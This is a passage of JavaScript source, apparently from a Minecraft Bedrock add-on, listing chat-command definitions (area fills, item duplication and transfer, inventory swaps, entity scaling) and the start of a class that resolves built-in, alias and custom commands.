            "idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]",
            "idtfill <center: x y z> <integrity: float> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [clearContainers: boolean]",
            "idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [clearContainers: boolean]",
            "idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [clearContainers: boolean]",
            "idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]",
            "idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [clearContainers: boolean]",
            "idtfill <center: x y z> <radius: x y z> <offset: x y z> <integrity: float> <length: float> <tileName: Block> hollowovoid [clearContainers: boolean]"
        ], command_version: "30.0.1-beta.99", description: "Same as the \\itfill command except for the fact that it allows you to specify the integrity of the fill. ", category: ["world"], commandSettingsId: "built-inCommandSettings:idtfill" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "iwalls", escregexp: { v: "^iwalls$" }, formats: [{ format: "iwalls <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "iwalls <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "6.0.0-beta.11", description: "Same as the \\ifill command except for the fact that it only fills the walls of the specified area. ", category: ["world"], commandSettingsId: "built-inCommandSettings:iwalls" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "itwalls", escregexp: { v: "^itwalls$" }, formats: [{ format: "itwalls <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "itwalls <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "7.0.0-beta.11", description: "Same as the \\iwalls command except for the fact that it temporarily spawns a tickingarea to load in the chunks where the blocks will be filled. ", category: ["world"], commandSettingsId: "built-inCommandSettings:itwalls" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "ihollow", escregexp: { v: "^ihollow$" }, formats: [{ format: "ihollow <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "ihollow <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "6.0.0-beta.11", description: "Same as the \\ifill command except for the fact that it only fills the sides of the specified area. ", category: ["world"], commandSettingsId: "built-inCommandSettings:ihollow" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "ithollow", escregexp: { v: "^ithollow$" }, formats: [{ format: "ithollow <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "ithollow <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "7.0.0-beta.11", description: "Same as the \\ihollow command except for the fact that it temporarily spawns a tickingarea to load in the chunks where the blocks will be filled. ", category: ["world"], commandSettingsId: "built-inCommandSettings:ithollow" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "ioutline", escregexp: { v: "^ioutline$" }, formats: [{ format: "ioutline <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "ioutline <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "6.0.0-beta.11", description: "Same as the \\ifill command except for the fact that it only fills the outline of the specified area. ", category: ["world"], commandSettingsId: "built-inCommandSettings:ioutline" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "itoutline", escregexp: { v: "^itoutline$" }, formats: [{ format: "itoutline <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "itoutline <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "7.0.0-beta.11", description: "Same as the \\ioutline command except for the fact that it temporarily spawns a tickingarea to load in the chunks where the blocks will be filled. ", category: ["world"], commandSettingsId: "built-inCommandSettings:itoutline" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "ipillars", escregexp: { v: "^ipillars$" }, formats: [{ format: "ipillars <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "ipillars <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "6.0.0-beta.11", description: "Same as the \\ifill command except for the fact that it only fills the pillars of the specified area. ", category: ["world"], commandSettingsId: "built-inCommandSettings:ipillars" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "itpillars", escregexp: { v: "^itpillars$" }, formats: [{ format: "itpillars <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "itpillars <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "7.0.0-beta.11", description: "Same as the \\ipillars command except for the fact that it temporarily spawns a tickingarea to load in the chunks where the blocks will be filled. ", category: ["world"], commandSettingsId: "built-inCommandSettings:itpillars" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "igfill", escregexp: { v: "^igfill$" }, formats: [{ format: "igfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "igfill <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "4.0.1-beta.99", description: "This is a version of the \\ifill command that uses a generator function so it does not cause as much lag, but it is VERY slow. Better version fo the vanilla /fill command that can fill secret blocks types that normally require an nbt editor to obtain, and has no fill size limits. ", category: ["world"], commandSettingsId: "built-inCommandSettings:igfill" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "iogfill", escregexp: { v: "^iogfill$" }, formats: [{ format: "iogfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "iogfill <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "4.1.1-beta.17", description: "This is a version of the \\ifill command that uses a generator function so it does not cause as much lag, but it is VERY slow. Better version fo the vanilla /fill command that can fill secret blocks types that normally require an nbt editor to obtain, and has no fill size limits. Same as \\igfill except for the fact that it always resets any non-specified block states to the defaults instead of keeping them as what they were if possible. ", category: ["world"], commandSettingsId: "built-inCommandSettings:iogfill" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "ifillb", escregexp: { v: "^ifillb$" }, formats: [{ format: "ifillb <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states|JSON|Array> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }, { format: "ifillb <from: x y z> <to: x y z> <tileName: Block> [replaceTileName: Block] [replaceBlockStates: block states|JSON|Array]" }], command_version: "1.0.1-beta.27", description: "Better version fo the vanilla /fill command that can fill secret blocks types that normally require an nbt editor to obtain, and has no fill size limits. Original version of the \\ifill command, only allows for matching exact block states but is much quicker. ", category: ["world"], commandSettingsId: "built-inCommandSettings:ifillb" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "stopgen", escregexp: { v: "^stopgen$" }, formats: [{ format: "stopgen <generatorId: int>" }], command_version: "1.0.0", description: "Stops generator functions such as the \\igfill and \\iogfill commands. ", category: ["misc"], commandSettingsId: "built-inCommandSettings:stopgen" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "cloneitem", escregexp: { v: "^cloneitem$" }, formats: [{ format: "cloneitem <toPlayer: playerName>" }], command_version: "0.1.9-beta.1", description: "", category: ["items"], commandSettingsId: "built-inCommandSettings:cloneitem" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "copyitem", escregexp: { v: "^copyitem$" }, formats: [{ format: "copyitem <slot: int|\"head\"|\"chest\"|\"legs\"|\"feet\"|\"mainhand\"|\"offhand\"> <toPlayer: playerName>" }], command_version: "0.1.4-beta.1", description: "", category: ["items"], commandSettingsId: "built-inCommandSettings:copyitem" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "dupeitem", escregexp: { v: "^dupeitem$" }, formats: [{ format: "dupeitem" }], command_version: "0.1.1-beta.1", description: "", category: ["items"], commandSettingsId: "built-inCommandSettings:dupeitem" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "transferitem", escregexp: { v: "^transferitem$" }, formats: [{ format: "transferitem <toPlayer: playerName>" }], command_version: "0.1.1-beta.1", description: "", category: ["items"], commandSettingsId: "built-inCommandSettings:transferitem" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "shuffleinventory", escregexp: { v: "^shuffleinventory$" }, aliases: [{ commandName: "invshuffle", escregexp: { v: "^invshuffle$" } }], formats: [{ format: "shuffleinventory [player: string|~]" }], command_version: "0.2.2-beta.2", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:shuffleinventory" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "swapitems", escregexp: { v: "^swapitems$" }, formats: [{ format: "swapitems <slot: number|~> <otherSlot: number|~> <otherPlayer: playerName>" }], command_version: "0.1.1-beta.1", description: "", category: ["items"], commandSettingsId: "built-inCommandSettings:swapitems" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "clear", escregexp: { v: "^clear$" }, formats: [{ format: "clear <target: string> [itemType: Item]" }], command_version: "0.0.1-indev.1", category: ["players"], description: "", commandSettingsId: "built-inCommandSettings:clear" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "takeitem", escregexp: { v: "^takeitem$" }, formats: [{ format: "takeitem <fromSlot: number|~> <fromPlayer: playerName>" }], command_version: "0.1.1-beta.1", description: "", category: ["items"], commandSettingsId: "built-inCommandSettings:takeitem" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "swapinventories", escregexp: { v: "^swapinventories$" }, aliases: [{ commandName: "invswap", escregexp: { v: "^invswap$" } }], formats: [{ format: "swapinventories <player1: string|~> <player2: string|~>" }], command_version: "0.2.1-beta.1", description: "Swaps the inventory, offhand, hotbar, and armor of two specified players. ", category: ["players"], commandSettingsId: "built-inCommandSettings:swapinventories" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "swapinventoriesb", escregexp: { v: "^swapinventoriesb$" }, aliases: [{ commandName: "invswapb", escregexp: { v: "^invswapb$" } }], formats: [{ format: "swapinventoriesb <player1: string|~> <player2: string|~>" }], command_version: "0.2.1-beta.1", description: "Swaps the inventory and hotbar of two specified players. ", category: ["players"], commandSettingsId: "built-inCommandSettings:swapinventoriesb" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "compressitems", escregexp: { v: "^compressitems$" }, formats: [{ format: "compressitems [mode: inventory|hotbar|armor|equipment|all] [target: string|~]" }], command_version: "1.0.0-rc.5", description: "Compresses your items into chest(s) and gives you those chest(s) as items. ", category: ["players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:compressitems" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "compressitemsshulker", escregexp: { v: "^compressitemsshulker$" }, formats: [{ format: "compressitemsshulker [mode: inventory|hotbar|armor|equipment|all] [target: string|~]" }], command_version: "1.0.0-rc.5", description: "Compresses your items into shulker box(es) and gives you those shulker box(es) as items. ", category: ["players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:compressitemsshulker" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "compressitemscontainer", escregexp: { v: "^compressitemscontainer$" }, formats: [{ format: "compressitemscontainer [containerType: Block] [mode: inventory|hotbar|armor|equipment|all] [target: string|~]" }], command_version: "1.0.0-rc.5", description: "Compresses your items into container(s) and gives you those container(s) as items. ", category: ["players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:compressitemscontainer" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "compressitemscontainerb", escregexp: { v: "^compressitemscontainerb$" }, formats: [{ format: "compressitemscontainerb [containerType: Block] [mode: inventory|hotbar|armor|equipment|all] [target: string|~]" }], command_version: "0.0.1-alpha.76", description: "Compresses your items into container(s) and gives you those container(s) as items. ", category: ["players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:compressitemscontainerb" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "scanenderchest", escregexp: { v: "^scanenderchest$" }, aliases: [{ commandName: "ecinvsee", escregexp: { v: "^ecinvsee$" } }, { commandName: "sncendchest", escregexp: { v: "^scnendchest$" } }], formats: [{ format: "scanenderchest [target: string|~]" }], command_version: "0.2.0-alpha.17", description: "", category: ["players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:scanenderchest" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "scanenderchestc", escregexp: { v: "^scanenderchestc$" }, aliases: [{ commandName: "ecinvseec", escregexp: { v: "^ecinvseec$" } }, { commandName: "sncendchestc", escregexp: { v: "^scnendchestc$" } }], formats: [{ format: "scanenderchestc [target: string|~]" }], command_version: "0.3.0-alpha.36", description: "", category: ["players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:scanenderchestc" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "clearenderchestslot", escregexp: { v: "^clearenderchestslot$" }, formats: [{ format: "clearenderchestslot [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]" }], command_version: "0.2.0-alpha.37", description: "", category: ["players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:clearenderchestslot" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "clearenderchest", escregexp: { v: "^clearenderchest$" }, formats: [{ format: "clearenderchest [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]" }], command_version: "0.0.0", description: "", category: ["players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:clearenderchest" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "filljunk", escregexp: { v: "^filljunk$" }, aliases: [{ commandName: "invfilljunk", escregexp: { v: "^invfilljunk$" } }], formats: [{ format: "filljunk [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]" }], command_version: "0.9.0-alpha.21", description: "", category: ["items", "players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:filljunk" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "fillrandom", escregexp: { v: "^fillrandom$" }, aliases: [{ commandName: "invfillrandom", escregexp: { v: "^invfillrandom$" } }], formats: [{ format: "fillrandom [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]" }], command_version: "1.0.0-rc.77", description: "", category: ["items", "players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:fillrandom" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "fillop", escregexp: { v: "^fillop$" }, aliases: [{ commandName: "invfillop", escregexp: { v: "^invfillop$" } }], formats: [{ format: "fillop [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]" }], command_version: "0.9.0-alpha.21", description: "", category: ["items", "players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:fillop" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "fillillegal", escregexp: { v: "^fillillegal$" }, aliases: [{ commandName: "invfillillegal", escregexp: { v: "^invfillillegal$" } }], formats: [{ format: "fillillegal [stackCount: int|fill|replaceall|replacefill] [stackSize: int|max|~] [target: string|~]" }], command_version: "0.9.0-alpha.21", description: "", category: ["items", "players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:fillillegal" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "fillinventory", escregexp: { v: "^fillinventory$" }, aliases: [{ commandName: "invfill", escregexp: { v: "^invfill$" } }], formats: [{ format: "fillinventory <itemJSON: itemJSON> [stackCount: int|fill|replaceall|replacefill] [target: string|~]" }], command_version: "1.0.0-beta.17", description: "", category: ["items", "players", "containers/inventories"], commandSettingsId: "built-inCommandSettings:fillinventory" },
    { type: "built-in", requiredTags: ["canUseChatCommands", "canUseDangerousCommands"], formatting_code: "§r§4", commandName: "chunkban", escregexp: { v: "^chunkban$" }, formats: [{ format: "chunkban [loopCount: int] [target: string|~]" }], command_version: "0.0.1-beta.72", description: "", category: ["dangerous"], commandSettingsId: "built-inCommandSettings:chunkban" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "extinguish", escregexp: { v: "^extinguish$" }, aliases: [{ commandName: "ext", escregexp: { v: "^ext$" } }], formats: [{ format: "extinguish [radius: number]" }], command_version: "2.2.0-beta.10", description: "Extinguishes fire in the specified radius, the radius default to 10 if not specified. ", category: ["world"], commandSettingsId: "built-inCommandSettings:extinguish" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§e", commandName: "remexp", escregexp: { v: "^remexp$" }, formats: [{ format: "remexp [radius: number]" }], command_version: "2.2.0-beta.5", description: "Removes explosives in the specified radius, the radius default to 10 if not specified. ", category: ["world"], commandSettingsId: "built-inCommandSettings:remexp" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§6", commandName: "morph", escregexp: { v: "^morph$" }, formats: [{ format: "" }], command_version: "1.0.1", description: "", category: ["Entity Scale Add-On"], commandSettingsId: "built-inCommandSettings:morph" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§6", commandName: "tint", escregexp: { v: "^tint$" }, formats: [{ format: "tint [red: float|~] [green: float|~] [blue: float|~] [alpha: float|~] [materialType: 0|1] [playerTarget: targetSelector]" }], command_version: "1.0.4", description: "", category: ["Entity Scale Add-On"], commandSettingsId: "built-inCommandSettings:tint" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§6", commandName: "scale", escregexp: { v: "^scale$" }, formats: [{ format: "" }], command_version: "1.0.1", description: "", category: ["Entity Scale Add-On"], commandSettingsId: "built-inCommandSettings:scale" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§6", commandName: "visualscale", escregexp: { v: "^visualscale$" }, formats: [{ format: "" }], command_version: "1.0.0-beta", description: "", category: ["Entity Scale Add-On"], commandSettingsId: "built-inCommandSettings:visualscale" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§6", commandName: "visualscaleenabled", escregexp: { v: "^visualscaleenabled$" }, formats: [{ format: "" }], command_version: "1.0.0-beta", description: "", category: ["Entity Scale Add-On"], commandSettingsId: "built-inCommandSettings:visualscaleenabled" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§6", commandName: "tps", escregexp: { v: "^tps$" }, formats: [{ format: "tps" }], command_version: "1.0.0", description: "", category: ["Entity Scale Add-On", "system", "world"], commandSettingsId: "built-inCommandSettings:tps" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "offlineinforaw", escregexp: { v: "^offlineinforaw$" }, formats: [{ format: "" }], command_version: "0.0.1-alpha.2", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:offlineinforaw" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "offlineuuidinforaw", escregexp: { v: "^offlineuuidinforaw$" }, formats: [{ format: "" }], command_version: "0.0.1-alpha.2", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:offlineuuidinforaw" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "offlineinfourl", escregexp: { v: "^offlineinfourl$" }, formats: [{ format: "" }], command_version: "0.0.1-alph.2a", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:offlineinfourl" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "offlineuuidinfourl", escregexp: { v: "^offlineuuidinfourl$" }, formats: [{ format: "" }], command_version: "0.0.1-alpha.2", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:offlineuuidinfourl" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "offlineinfoescaped", escregexp: { v: "^offlineinfoescaped$" }, formats: [{ format: "" }], command_version: "0.0.1-alpha.2", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:offlineinfoescaped" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§c", commandName: "offlineuuidinfoescaped", escregexp: { v: "^offlineuuidinfoescaped$" }, formats: [{ format: "" }], command_version: "0.0.1-alpha.2", description: "", category: ["players"], commandSettingsId: "built-inCommandSettings:offlineuuidinfoescaped" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "help", escregexp: { v: "^help$" }, formats: [{ format: "help" }, { format: "help chatcommands", description: "lists the available chat commands and their main formats" }, { format: "help javascriptfunctions", description: "lists all available javascript functions, constants, variables, and classes" }, { format: "help jsfunction <jsObjectId: string>", description: "gets the source code of a specific javascript function, constant, variable, or class" }], command_version: "1.5.2", category: ["misc"], description: "", commandSettingsId: "built-inCommandSettings:help" }
]; /*
export let abcdefgh = escapeRegExp.arguments*/
export class command {
    constructor(command) {
        this.format_version = format_version;
        this.commands_format_version = commands_format_version;
        this.formatting_code = "§r§f";
        this.type = command.type ?? "unknown";
        let commandtest = undefined;
        try {
            commandtest = (command.type == "built-in" ? commands.find(v => v.commandName == command.commandName) ?? (() => { let a = commands.find(v => !!v.aliases?.find(vb => vb.commandName == command.commandName)); if (!!a) {
                this.selectedalias = { index: a.aliases?.findIndex(vb => vb.commandName == command.commandName), alias: new cmds.command(a)?.aliases?.find?.(vb => vb.commandName == command.commandName) };
                return a;
            }
            else {
                return;
            } })() : (command.type == "custom" ? JSONParse(String(world.getDynamicProperty(world.getDynamicPropertyIds().find(v => v == "customCommand:" + command.commandName)) ?? "undefined")) : ((commands.find(v => v.commandName == command.commandName) ?? (() => { let a = commands.find(v => !!v.aliases?.find(vb => vb.commandName == command.commandName)); if (!!a) {
                this.selectedalias = { index: a.aliases?.findIndex(vb => vb.commandName == command.commandName), alias: new cmds.command(a)?.aliases?.find?.(vb => vb.commandName == command.commandName) };
                return new cmds.command(a);
            }
            else {
                return;
            } })() ?? JSONParse(String(world.getDynamicProperty(world.getDynamicPropertyIds().find(v => v == "customCommand:" + command.commandName)) ?? "undefined"))))));
        }
        catch { }
        ;
        this.description = command.description ?? commandtest?.description;
        this.commandName = this?.selectedalias?.alias?.aliasTo ?? command.commandName;
        this.currentCommandName = this?.selectedalias?.alias?.commandName ?? command.commandName;
        this.command_version = command.command_version ?? commandtest?.command_version;
        this.escregexp = command.escregexp ?? commandtest?.escregexp ?? { v: "^" + command.commandName + "$" };
        this.currentescregexp = command.escregexp ?? this?.selectedalias?.alias?.escregexp ?? commandtest?.escregexp ?? { v: "^" + this.currentCommandName + "$" };
        this.formats = command.formats ?? commandtest?.formats; /*
        this.parameters = command.parameters; */
        this.format_version = command.format_version ?? commandtest?.format_version ?? format_version;
        this.commands_format_version = command.commands_format_version ?? commandtest?.commands_format_version ?? commands_format_version;
        this.commandSettingsId = command.commandSettingsId ?? commandtest?.commandSettingsId ?? (command.type == "built-in" ? ("built-inCommandSettings:" + command.commandName) : ("customCommandSettings:" + command.commandName));
        this.customCommandId = command.customCommandId ?? (this.type == "custom" ? ("customCommand:" + command.commandName) : undefined);
        this.formatting_code = command.formatting_code ?? commandtest?.formatting_code ?? "§r§f";
        this.customCommandType = command.customCommandType ?? commandtest?.customCommandType;
        this.customCommandPrefix = command.customCommandPrefix ?? commandtest?.customCommandPrefix;
        this.customCommandParametersEnabled = command.customCommandParametersEnabled ?? commandtest?.customCommandParametersEnabled;
        this.customCommandParametersList = command.customCommandParametersList ?? commandtest?.customCommandParametersList;
        this.customCommandCodeLines = command.customCommandCodeLines ?? commandtest?.customCommandCodeLines;
        this.category = command.category ?? commandtest?.category;
        this.categories = sOSATSA(command.category ?? commandtest?.category ?? []);
    }
    get regexp() { return new RegExp(this?.escregexp?.v ?? "", this?.escregexp?.f); }
    get currentregexp() { return new RegExp(this?.currentescregexp?.v ?? "", this?.currentescregexp?.f); }
    get aliases() { return this.type == "built-in" ? commands.find(v => v.commandName == this.commandName)?.aliases?.map?.(v => (() => { let vb = v; vb.regexp = new RegExp(vb?.escregexp?.v ?? "", vb?.escregexp?.f); vb.aliasTo = this.commandName; return vb; })()) : undefined; }
    get settings() { return new commandSettings(this.commandSettingsId, this); }
    get code() { if (this.type == "custom") {
        if (this?.customCommandId != undefined) {
            return world.getDynamicPropertyIds().filter(v => v.startsWith("customCommandCode:" + this.commandName + ":")).sort((a, b) => Number(a?.split(":")?.slice(-1)[0]) - Number(b?.split(":")?.slice(-1)[0])).map(v => String(world.getDynamicProperty(v)));
        }
        else {
            throw new TypeError("Cannot get the code of the command because the customCommandId is undefined. ");
        }
    }
    else {
        throw new TypeError("Cannot get the code of the command because it is not a custom command or the type of the command is unknown. ");
    } } /*
